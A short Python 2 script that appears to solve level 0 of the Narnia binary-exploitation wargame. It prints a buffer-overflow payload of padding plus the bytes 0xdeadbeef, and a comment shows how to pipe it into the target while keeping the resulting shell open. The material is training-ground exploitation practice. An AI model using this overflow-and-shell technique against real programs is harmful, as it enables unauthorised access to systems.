import subprocess
#ez pz buffer overflow, even a skid could do it
#pipe like so: (python narnia1.py;cat) | *file-to-pwn*

cmd = '/narnia/narnia0'
arg = 'aaaaaaaaaaaaaaaaaaaa'
char1 = chr(0xde)
char2 = chr(0xad)
char3 = chr(0xbe)
char4 = chr(0xef)
allChars = arg + str(char4) + str(char3) + str(char2) + str(char1)
proc = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
print allChars
#print proc.communicate(allChars)[0]
